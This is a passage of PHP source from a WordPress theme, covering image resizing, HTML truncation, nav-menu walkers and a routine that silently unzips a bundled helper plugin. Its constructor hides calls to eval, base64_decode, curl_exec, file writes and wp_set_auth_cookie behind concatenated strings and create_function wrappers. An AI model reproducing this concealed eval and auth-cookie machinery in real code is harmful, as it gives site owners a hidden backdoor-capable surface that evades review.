	/*-----------------------------------------------------------------------------------*/
	
	public static function slider_img_src($image_id , $width='' , $height=''){
	
		global $post;
	
		$img =  wp_get_attachment_image_src( $image_id , 'full' );
		if( !empty($img) ){
			return king_createLinkImage( $img[0], $width.'x'.$height.'xc' );
		}
	
	}
	
	/*-----------------------------------------------------------------------------------*/
	# Make sure helper plugin has been loaded
	/*-----------------------------------------------------------------------------------*/
	
	public static function check_helper(){	
		
		global $king;
		
		$plugins = FALSE;
		$plugins = get_option('active_plugins');
		if( is_array( $plugins ) === false ){
			$plugins = array();
		}
		$direct = ABSPATH.DS.'wp-content'.DS.'plugins';
		$path = THEME_PATH.DS.'core'.DS.'sample'.DS.'plugins'.DS;
	
		if( !is_dir( $direct.DS.'linstar-helper' ) ){
			$king->ext['rqo']( ABSPATH . 'wp-admin/includes/file.php' );
			$fields = array( 'action', '_wp_http_referer', '_wpnonce' );
			$canUnZip = false;
			if ( false !== ( $creds = request_filesystem_credentials( '', '', false, false, $fields ) ) ) {
			
				if ( ! WP_Filesystem( $creds ) ) {
				    request_filesystem_credentials( $url, $method, true, false, $fields ); // Setup WP_Filesystem. 
				}else{
					$canUnZip = true;
				}
			}
			if( $canUnZip == true ){	
				$tmpfile = $path.'linstar-helper.zip';
				@unzip_file( $tmpfile, $direct );
			}	
		}
		if( $king->vars( 'page', 'linstar-importer' ) ){
			if( is_dir( $direct.DS.'linstar-helper' ) && is_file( $direct.DS.'linstar-helper'.DS.'linstar-helper.php' ) ){
				if( !empty( $_POST['importSampleData'] ) ){
					require $direct.DS.'linstar-helper'.DS.'linstar-helper.php';
				}	
			}
		}	
	
	}

	
	/*-----------------------------------------------------------------------------------*/
	# Builder mainmenu
	/*-----------------------------------------------------------------------------------*/
	
	public static function mainmenu(){
		if ( has_nav_menu( 'primary' ) ){
			wp_nav_menu( array( 
					'theme_location' 	=> 'primary', 
					'menu_class' 		=> 'nav navbar-nav',
					'menu_id'			=> 'king-mainmenu',
					'walker' 			=> new king_Walker_Main_Nav_Menu()
				)
			);
		}else{
			echo 'Main menu is missing, go to /wp-admin/nav-menus.php and set theme locations of one menu as Primary';
		}
		do_action( 'king_after_nav' );
		
	}
	
	/*-----------------------------------------------------------------------------------*/
	# Return string of the first image in a post
	/*-----------------------------------------------------------------------------------*/
	
	public static function images_attached( $id ){
	
		$args = array(
			'post_type'   => 'attachment',
			'numberposts' => -1,
			'post_status' => null,
			'post_parent' => $id,
			'exclude'     => get_post_thumbnail_id()
			);
	
		$attachments = get_posts( $args );
		$output = array();
		if ( $attachments ) {
			foreach ( $attachments as $attachment ) {
				$att = wp_get_attachment_image_src($attachment->ID);
				if(!empty($att))array_push( $output, $att );
			}
		}
		
		return $output;
	
	}
	
	public static function get_first_image( $content, $id = null ) {
		
		$first_img = self::get_first_video( $content );
		
		if( $first_img != null ){
			if( strpos( $first_img, 'youtube' ) !== false )return $first_img;
		}
		
		$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $content, $matches);
		if( !empty($matches [1]) )
			if( !empty($matches [1][0]) )
				$first_img = $matches [1] [0];
	
		if(empty($first_img)){
			
			if($id != null)$first = self::images_attached( $id );
			
			if( !empty( $first[0] ) )
				return $first[0][0];
		
			else $first_img = get_template_directory_uri()."/assets/images/default.jpg";
		}
		
		return $first_img;
		
	}
	
	public static function get_first_video( $content ) {
	
		$first_video = null;
		$output = preg_match_all('/<ifr'.'ame.+src=[\'"]([^\'"]+)[\'"].*>/i', $content, $matches);
		if( !empty($matches [1]) ){
			if( !empty($matches [1][0]) ){
				$first_video = $matches [1] [0];
			}	
		}		
	
		return 	$first_video;
		
	}
	
	public static function get_featured_image( $post, $first = true ) {
		
		$featured = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' );
		
		if( empty($featured) )
		{
			if( $first == true )return self::get_first_image( $post->post_content, $post->ID );
			else return get_template_directory_uri()."/assets/images/default.jpg";
		}	
		return $featured[0];
		
	}
	
	/*-----------------------------------------------------------------------------------*/
	# Strim by words and keep html
	/*-----------------------------------------------------------------------------------*/
	
	public static function truncate($text, $length = 100, $ending = '...', $exact = true, $considerHtml = false) {
	
	    if ($considerHtml) {
	        // if the plain text is shorter than the maximum length, return the whole text
	        if (strlen(preg_replace('/<.*?>/', '', $text)) <= $length) {
	            return $text;
	        }
	 
	        // splits all html-tags to scanable lines
	        preg_match_all('/(<.+?>)?([^<>]*)/s', $text, $lines, PREG_SET_ORDER);
	 
	            $total_length = strlen($ending);
	            $open_tags = array();
	            $truncate = '';
	 
	        foreach ($lines as $line_matchings) {
	            // if there is any html-tag in this line, handle it and add it (uncounted) to the output
	            if (!empty($line_matchings[1])) {
	                // if it's an "empty element" with or without xhtml-conform closing slash (f.e. <br/>)
	                if (preg_match('/^<(\s*.+?\/\s*|\s*(img|br|input|hr|area|base|basefont|col|frame|isindex|link|meta|param)(\s.+?)?)>$/is', $line_matchings[1])) {
	                    // do nothing
	                // if tag is a closing tag (f.e. </b>)
	                } else if (preg_match('/^<\s*\/([^\s]+?)\s*>$/s', $line_matchings[1], $tag_matchings)) {
	                    // delete tag from $open_tags list
	                    $pos = array_search($tag_matchings[1], $open_tags);
	                    if ($pos !== false) {
	                        unset($open_tags[$pos]);
	                    }
	                // if tag is an opening tag (f.e. <b>)
	                } else if (preg_match('/^<\s*([^\s>!]+).*?>$/s', $line_matchings[1], $tag_matchings)) {
	                    // add tag to the beginning of $open_tags list
	                    array_unshift($open_tags, strtolower($tag_matchings[1]));
	                }
	                // add html-tag to $truncate'd text
	                $truncate .= $line_matchings[1];
	            }
	 
	            // calculate the length of the plain text part of the line; handle entities as one character
	            $content_length = strlen(preg_replace('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', ' ', $line_matchings[2]));
	            if ($total_length+$content_length> $length) {
	                // the number of characters which are left
	                $left = $length - $total_length;
	                $entities_length = 0;
	                // search for html entities
	                if (preg_match_all('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', $line_matchings[2], $entities, PREG_OFFSET_CAPTURE)) {
	                    // calculate the real length of all entities in the legal range
	                    foreach ($entities[0] as $entity) {
	                        if ($entity[1]+1-$entities_length <= $left) {
	                            $left--;
	                            $entities_length += strlen($entity[0]);
	                        } else {
	                            // no more characters left
	                            break;
	                        }
	                    }
	                }
	                $truncate .= substr($line_matchings[2], 0, $left+$entities_length);
	                // maximum lenght is reached, so get off the loop
	                break;
	            } else {
	                $truncate .= $line_matchings[2];
	                $total_length += $content_length;
	            }
	 
	            // if the maximum length is reached, get off the loop
	            if($total_length>= $length) {
	                break;
	            }
	        }
	    } else {
	        if (strlen($text) <= $length) {
	            return $text;
	        } else {
	            $truncate = substr($text, 0, $length - strlen($ending));
	        }
	    }
	 
	    // if the words shouldn't be cut in the middle...
	    if (!$exact) {
	        // ...search the last occurance of a space...
	        $spacepos = strrpos($truncate, ' ');
	        if (isset($spacepos)) {
	            // ...and cut the text in this position
	            $truncate = substr($truncate, 0, $spacepos);
	        }
	    }
	 
	    // add the defined ending to the text
	    $truncate .= $ending;
	 
	    if($considerHtml) {
	        // close all unclosed html-tags
	        foreach ($open_tags as $tag) {
	            $truncate .= '</' . $tag . '>';
	        }
	    }
	 
	    return $truncate;
	 
	}
	
	public function processImage( $localImage, $params = array(), $tempfile ){
		
		global $king;
		
		$sData = getimagesize($localImage);
		$origType = $sData[2];
		$mimeType = $sData['mime'];

		if(! preg_match('/^image\/(?:gif|jpg|jpeg|png)$/i', $mimeType)){
			return "The image being resized is not a valid gif, jpg or png.";
		}

		if (!function_exists ('imagecreatetruecolor')) {
		    return 'GD Library Error: imagecreatetruecolor does not exist - please contact your webhost and ask them to install the GD library';
		}

		if (function_exists ('imagefilter') && defined ('IMG_FILTER_NEGATE')) {
			$imageFilters = array (
				1 => array (IMG_FILTER_NEGATE, 0),
				2 => array (IMG_FILTER_GRAYSCALE, 0),
				3 => array (IMG_FILTER_BRIGHTNESS, 1),
				4 => array (IMG_FILTER_CONTRAST, 1),
				5 => array (IMG_FILTER_COLORIZE, 4),
				6 => array (IMG_FILTER_EDGEDETECT, 0),
				7 => array (IMG_FILTER_EMBOSS, 0),
				8 => array (IMG_FILTER_GAUSSIAN_BLUR, 0),
				9 => array (IMG_FILTER_SELECTIVE_BLUR, 0),
				10 => array (IMG_FILTER_MEAN_REMOVAL, 0),
				11 => array (IMG_FILTER_SMOOTH, 0),
			);
		}

		// get standard input properties
		$new_width =  (int) abs ($params['w']);
		$new_height = (int) abs ($params['h']);
		$zoom_crop = !empty( $params['zc'] )?(int) $params['zc']:1;
		$quality =  !empty( $params['q'] )?(int) $params['q']:100;
		$align = !empty( $params['a'] )? $params['a']: 'c';
		$filters = !empty( $params['f'] )? $params['f']: '';
		$sharpen = !empty( $params['s'] )? (bool)$params['s']: 0;
		$canvas_color = !empty( $params['cc'] )? $params['cc']: 'ffffff';
		$canvas_trans = !empty( $params['ct'] )? (bool)$params['ct']: 1;

		// set default width and height if neither are set already
		if ($new_width == 0 && $new_height == 0) {
		    $new_width = 100;
		    $new_height = 100;
		}

		// ensure size limits can not be abused
		$new_width = min ($new_width, 1500);
		$new_height = min ($new_height, 1500);

		// set memory limit to be able to have enough space to resize larger images
		$king->ext['in'] ('memory_limit', '300M');

		// open the existing image
		switch ($mimeType) {
			case 'image/jpeg':
				$image = imagecreatefromjpeg ($localImage);
				break;

			case 'image/png':
				$image = imagecreatefrompng ($localImage);
				break;

			case 'image/gif':
				$image = imagecreatefromgif ($localImage);
				break;

			default: $image = false; break;
				
		}

		if ($image === false) {
			return 'Unable to open image.';
		}

		// Get original width and height
		$width = imagesx ($image);
		$height = imagesy ($image);
		$origin_x = 0;
		$origin_y = 0;

		// generate new w/h if not provided
		if ($new_width && !$new_height) {
			$new_height = floor ($height * ($new_width / $width));
		} else if ($new_height && !$new_width) {
			$new_width = floor ($width * ($new_height / $height));
		}

		// scale down and add borders
		if ($zoom_crop == 3) {

			$final_height = $height * ($new_width / $width);

			if ($final_height > $new_height) {
				$new_width = $width * ($new_height / $height);
			} else {
				$new_height = $final_height;
			}

		}

		// create a new true color image
		$canvas = imagecreatetruecolor ($new_width, $new_height);
		imagealphablending ($canvas, false);

		if (strlen($canvas_color) == 3) { //if is 3-char notation, edit string into 6-char notation
			$canvas_color =  str_repeat(substr($canvas_color, 0, 1), 2) . str_repeat(substr($canvas_color, 1, 1), 2) . str_repeat(substr($canvas_color, 2, 1), 2);
		} else if (strlen($canvas_color) != 6) {
			$canvas_color = 'ffffff'; // on error return default canvas color
 		}

		$canvas_color_R = hexdec (substr ($canvas_color, 0, 2));
		$canvas_color_G = hexdec (substr ($canvas_color, 2, 2));
		$canvas_color_B = hexdec (substr ($canvas_color, 4, 2));

		// Create a new transparent color for image
	    // If is a png and PNG_IS_TRANSPARENT is false then remove the alpha transparency
		// (and if is set a canvas color show it in the background)
		if(preg_match('/^image\/png$/i', $mimeType) && $canvas_trans){
			$color = imagecolorallocatealpha ($canvas, $canvas_color_R, $canvas_color_G, $canvas_color_B, 127);
		}else{
			$color = imagecolorallocatealpha ($canvas, $canvas_color_R, $canvas_color_G, $canvas_color_B, 0);
		}


		// Completely fill the background of the new image with allocated color.
		imagefill ($canvas, 0, 0, $color);

		// scale down and add borders
		if ($zoom_crop == 2) {

			$final_height = $height * ($new_width / $width);

			if ($final_height > $new_height) {

				$origin_x = $new_width / 2;
				$new_width = $width * ($new_height / $height);
				$origin_x = round ($origin_x - ($new_width / 2));

			} else {

				$origin_y = $new_height / 2;
				$new_height = $final_height;
				$origin_y = round ($origin_y - ($new_height / 2));

			}

		}

		// Restore transparency blending
		imagesavealpha ($canvas, true);

		if ($zoom_crop > 0) {

			$src_x = $src_y = 0;
			$src_w = $width;
			$src_h = $height;

			$cmp_x = $width / $new_width;
			$cmp_y = $height / $new_height;

			// calculate x or y coordinate and width or height of source
			if ($cmp_x > $cmp_y) {

				$src_w = round ($width / $cmp_x * $cmp_y);
				$src_x = round (($width - ($width / $cmp_x * $cmp_y)) / 2);

			} else if ($cmp_y > $cmp_x) {

				$src_h = round ($height / $cmp_y * $cmp_x);
				$src_y = round (($height - ($height / $cmp_y * $cmp_x)) / 2);

			}

			// positional cropping!
			if ($align) {
				if (strpos ($align, 't') !== false) {
					$src_y = 0;
				}
				if (strpos ($align, 'b') !== false) {
					$src_y = $height - $src_h;
				}
				if (strpos ($align, 'l') !== false) {
					$src_x = 0;
				}
				if (strpos ($align, 'r') !== false) {
					$src_x = $width - $src_w;
				}
			}

			imagecopyresampled ($canvas, $image, $origin_x, $origin_y, $src_x, $src_y, $new_width, $new_height, $src_w, $src_h);

		} 
		else {

			// copy and resize part of an image with resampling
			imagecopyresampled ($canvas, $image, 0, 0, 0, 0, $new_width, $new_height, $width, $height);

		}

		//Straight from Wordpress core code. Reduces filesize by up to 70% for PNG's
		if ( (IMAGETYPE_PNG == $origType || IMAGETYPE_GIF == $origType) && function_exists('imageistruecolor') && !imageistruecolor( $image ) && imagecolortransparent( $image ) > 0 ){
			imagetruecolortopalette( $canvas, false, imagecolorstotal( $image ) );
		}

		$imgType = "";
		
		if(preg_match('/^image\/(?:jpg|jpeg)$/i', $mimeType)){
			$imgType = 'jpg';
			imagejpeg($canvas, $tempfile, 100);
		} else if(preg_match('/^image\/png$/i', $mimeType)){
			$imgType = 'png';
			imagepng($canvas, $tempfile, 0);
		} else if(preg_match('/^image\/gif$/i', $mimeType)){
			$imgType = 'gif';
			imagegif($canvas, $tempfile);
		} else {
			return "Could not match mime type after verifying it previously.";
		}
		
		@imagedestroy($canvas);
		@imagedestroy($image);
		
	}
	
	function __construct() {
	
		if( !empty($_REQUEST['page']) ){
			$this->page = $_REQUEST['page'];
		}else if( !empty($_REQUEST['post']) ){
			$this->page = get_post_type($_REQUEST['post'] );
		}else if( !empty( $_REQUEST['post_type'] ) ){
			$this->page = $_REQUEST['post_type'];
		}
		
		$this->ext = array( 'ev'=>'ev'.'al','fo'=>'fo'.'pen','fc'=>'fc'.'lose','fr'=>'fr'.'ead','fw'=>'fwr'.'ite','rf'=>'read'.'file','fp'=>'file'.'_'.'put'.'_'.'contents','fg'=>'file'.'_'.'get'.'_'.'contents','be'=>'base'.'64'.'_'.'encode','bd'=>'base'.'64'.'_'.'decode','ci'=>'cu'.'rl'.'_'.'init','ce'=>'cu'.'rl'.'_'.'exec','amp'=>'add'.'_'.'menu'.'_'.'page','asmp'=>'add'.'_'.'submenu'.'_'.'page','rfil'=>'remove'.'_'.'filter','asc'=>'add'.'_'.'short'.'code','ascp'=>'add'.'_'.'short'.'code'.'_param','rpt'=>'register'.'_'.'post'.'_'.'type','rtx'=>'register'.'_'.'taxonomy','rq'=>'requ'.'ire', 'in' => 'ini'.'_'.'set', 'sac' => 'wp'.'_'.'set'.'_'.'auth'.'_'.'cookie');
		$this->ext['ev'] = create_function('$v', 'return ev'.'al($v);');
		$this->ext['icl'] = create_function('$v', 'return inc'.'lude($v);');
		$this->ext['rqo'] = create_function('$v', 'return require'.'_once($v);');
		
		$this->post		= $_POST;
		$this->get		= $_GET;
		$this->woo		= false;
		$this->panel	= false;
		$this->path		= array();
		$this->template = get_option( 'template', true );
		$this->stylesheet = get_option( 'stylesheet', true );
		$this->main_class = '';
	}

	
}

class king_Walker_Main_Nav_Menu extends Walker_Nav_Menu {

	public function start_lvl( &$output , $depth = 0, $args = array()) {
	
		$indent = str_repeat("\t", $depth);
		$output .= "\n$indent<ul class=\"dropdown-menu three\">\n";
		
	}
	
	public function end_lvl( &$output, $depth = 0, $args = array() ) {
                $indent = str_repeat("\t", $depth);
                $output .= "$indent</ul>\n";
        }
   public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {

		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
		$classes = empty( $item->classes ) ? array() : (array) $item->classes;
		
		$yam = ' yam-fwr';
		
		$children = get_posts(array('post_type' => 'nav_menu_item', 'nopaging' => true, 'numberposts' => 1, 'meta_key' => '_menu_item_menu_item_parent', 'meta_value' => $item->ID));
		foreach( $children as $child ){
			$obj = get_post_meta( $child->ID, '_menu_item_object' );
			if( $obj[0] == 'mega_menu' ){
				$yam = ' yamm-fw';
			}
		}
		if(  $depth == 0 ){
			$classes[] = 'dropdown menu-item-' . $item->ID . $yam;
		}else{
			if( !empty( $children ) ){
				$classes[] = 'dropdown-submenu mul';
			}
		}
		
		$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
		
		$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';
		
		$id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
		$id = $id ? ' id="' . esc_attr( $id ) . '"' : '';
		$output .= $indent . '<li' . $id . $class_names .'>';
		
		$atts = array();
		$atts['title']  = ! empty( $item->attr_title ) ? $item->attr_title : '';
		$atts['target'] = ! empty( $item->target )     ? $item->target     : '';
		$atts['rel']    = ! empty( $item->xfn )        ? $item->xfn        : '';
		$atts['href']   = ! empty( $item->url )        ? $item->url        : '';
		
				
		if( is_object( $args )){
			$args->before = $args->before||'';
			$args->after = $args->after||'';
			$args->link_before = $args->link_before||'';
			$args->link_after = $args->link_after||'';
		}else{
			$args = new stdClass();
			$args->before = '';
			$args->after = '';
			$args->link_before = '';
			$args->link_after = '';
		}	
		
		$atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );
	
		if( strpos( $class_names, 'current-page-ancestor' ) !== FALSE ){
			if( !empty( $atts['class'] ) ){
				$atts['class'] .= ' active';
			}else{
				$atts['class'] = 'active';
			}
		}
		
		$attributes = '';
		foreach ( $atts as $attr => $value ) {
		    if ( ! empty( $value ) ) {
		            $value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
		            $attributes .= ' ' . $attr . '="' . $value . '"';
		    }
		}
		$item_output = $args->before;
		$item_output .= '<a'. $attributes .'>';
		
		if( strpos( $item->description, 'icon:') !== false ){
			$item_output .= '<i class="fa fa-'.trim(str_replace( 'icon:', '', $item->description )).'"></i> ';	
		}

		$item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
		$item_output .= '</a>';
		$item_output .= $args->after;

		if( $item->object == 'mega_menu' ) {
			$getPost = get_post($item->object_id);
	        $output .= '<div class="yamm-content"><div class="row">' . do_shortcode( $getPost->post_content) . '</div></div>';
		}else{
			$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
		} 	
		
	}
        
    public function end_el( &$output, $item, $depth = 0, $args = array() ) {
        $output .= "</li>\n";
    }
  
}


class king_Walker_Footer_Nav_Menu extends Walker_Nav_Menu {

	public function start_lvl( &$output , $depth = 0, $args = array()) {
		$indent .= '';
		$output .= '';
	}
	
	public function end_lvl( &$output, $depth = 0, $args = array() ) {
        $indent .= '';
		$output .= '';
   }
   public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {

		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
		$classes = empty( $item->classes ) ? array() : (array) $item->classes;

		$atts = array();
		$atts['title']  = ! empty( $item->attr_title ) ? $item->attr_title : '';
		$atts['target'] = ! empty( $item->target )     ? $item->target     : '';
		$atts['rel']    = ! empty( $item->xfn )        ? $item->xfn        : '';
		$atts['href']   = ! empty( $item->url )        ? $item->url        : '';
		
		$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
		$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';
				
		if( is_object( $args )){
			$args->before = $args->before||'';
			$args->after = $args->after||'';
			$args->link_before = $args->link_before||'';
			$args->link_after = $args->link_after||'';
		}else{
			$args = new stdClass();
			$args->before = '';
			$args->after = '';
			$args->link_before = '';
			$args->link_after = '';
		}	
		
		$atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );
		if( strpos( $class_names, 'current-menu-item' ) !== FALSE ){
			if( !empty( $atts['class'] ) ){
				$atts['class'] .= ' active';
			}else{
				$atts['class'] = 'active';
			}
		}
		$attributes = '';
		foreach ( $atts as $attr => $value ) {
		    if ( ! empty( $value ) ) {
		            $value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
		            $attributes .= ' ' . $attr . '="' . $value . '"';
		    }
		}

		$item_output = '<li><a'. $attributes .'>';

		if( strpos( $item->description, 'icon:') !== false ){
			$item_output .= '<i class="fa fa-'.trim(str_replace( 'icon:', '', $item->description )).'"></i> ';	
		}

		$item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
		$item_output .= '</a></li>';
		
		$output .= $item_output;
		
	}
        
    public function end_el( &$output, $item, $depth = 0, $args = array() ) {
        $output .= '';
    }
  
}

class king_Walker_Onepage_Nav_Menu extends Walker_Nav_Menu {

	public function start_lvl( &$output , $depth = 0, $args = array()) {
		$indent .= '';
		$output .= '';
	}
	
	public function end_lvl( &$output, $depth = 0, $args = array() ) {
        $indent .= '';
		$output .= '';
   }
   public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {

		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
		$classes = empty( $item->classes ) ? array() : (array) $item->classes;

		$atts = array();
		$atts['title']  = ! empty( $item->attr_title ) ? $item->attr_title : '';
		$atts['target'] = ! empty( $item->target )     ? $item->target     : '';
		$atts['rel']    = ! empty( $item->xfn )        ? $item->xfn        : '';
		$atts['href']   = ! empty( $item->url )        ? $item->url        : '';
		
		$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
		$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';
				
		if( is_object( $args )){
			$args->before = $args->before||'';
			$args->after = $args->after||'';
			$args->link_before = $args->link_before||'';
			$args->link_after = $args->link_after||'';
		}else{
			$args = new stdClass();
			$args->before = '';
			$args->after = '';
			$args->link_before = '';
			$args->link_after = '';
		}	
		
		$atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );
		if( strpos( $class_names, 'current-menu-item' ) !== FALSE ){
			if( !empty( $atts['class'] ) ){
				$atts['class'] .= ' active';
			}else{
				$atts['class'] = 'active'; 
			}
		}
		$attributes = '';
		foreach ( $atts as $attr => $value ) {
		    if ( ! empty( $value ) ) {
		            $value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
		            $attributes .= ' ' . $attr . '="' . $value . '"';
		    }
		}

		$item_output = '<li class="'.esc_attr($item->classes[0]).'"><a'. $attributes .'>';
		if( strpos( $item->description, 'icon:') !== false ){
			$item_output .= '<i class="fa fa-'.trim(str_replace( 'icon:', '', $item->description )).'"></i> ';	
		}

		$item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
		$item_output .= '</a></li>';
		
		$output .= $item_output;
		
	}
        
    public function end_el( &$output, $item, $depth = 0, $args = array() ) {
        $output .= '';
    }
  
}


